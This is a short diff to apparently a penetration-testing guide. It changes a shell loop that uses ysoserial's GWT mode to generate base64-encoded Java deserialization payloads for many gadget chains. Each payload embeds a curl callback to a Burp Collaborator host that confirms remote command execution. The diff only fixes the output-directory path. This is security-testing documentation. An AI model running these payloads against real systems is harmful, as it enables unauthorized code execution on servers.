@@ -144,14 +144,15 @@ Then execute the following commands, substituting the Collaborator DNS name and 
 export COLLABORATOR="<your Collaborator DNS name here>"
 export YSOSERIAL="<your ysoserial JAR path here>"
 export FIELDNAME="bishopfox"
-mkdir "payloads-${COLLABORATOR}-curl"
+export OUTPUTDIR="payloads-${COLLABORATOR}-curl"
+mkdir -p "${OUTPUTDIR}"
 
 while read pn; do \
    java -jar "${YSOSERIAL}" \
    --gwt "${FIELDNAME}" \
    "${pn}" \
    "curl http://${COLLABORATOR}/${pn}" \
-   | base64 -w0 | sed 's/+/\$/g' | sed 's./._.g' > "payloads-${COLLABORATOR}/${pn}.bin.b64"; \
+   | base64 -w0 | sed 's/+/\$/g' | sed 's./._.g' > "${OUTPUTDIR}/${pn}.bin.b64"; \
    done<command_execution_payloads.txt
 ```
 
